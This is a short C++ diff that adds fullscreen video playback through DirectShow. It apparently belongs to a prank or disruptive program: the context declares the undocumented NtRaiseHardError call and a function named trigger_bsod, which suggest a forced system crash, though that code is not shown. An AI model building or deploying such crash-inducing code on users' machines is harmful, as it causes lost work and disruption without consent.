@@ -15,6 +15,7 @@ extern "C" NTSTATUS NTAPI NtRaiseHardError(LONG ErrorStatus, ULONG Unless1, ULON
 IGraphBuilder *graph = 0; 		// filter graph manager
 IMediaControl *control = 0; 	// media control interface
 IMediaEvent   *event = 0; 		// media event interface
+IVideoWindow  *window = 0;		// the video window
 
 // helpful functions
 void initialize_directshow(LPCWSTR path) {
@@ -26,9 +27,13 @@ void initialize_directshow(LPCWSTR path) {
 	// get addition interfaces for it
 	graph->QueryInterface(IID_IMediaControl, (void **)&control);
 	graph->QueryInterface(IID_IMediaEvent, (void **)&event);
+	graph->QueryInterface(IID_IVideoWindow, (void **)&window);
 
 	// attempt to build the graph for file playback
 	graph->RenderFile(path, NULL);
+
+	// set the video window to fullscreen mode
+	window->put_FullScreenMode(OATRUE);
 }
 
 unsigned long trigger_bsod() {
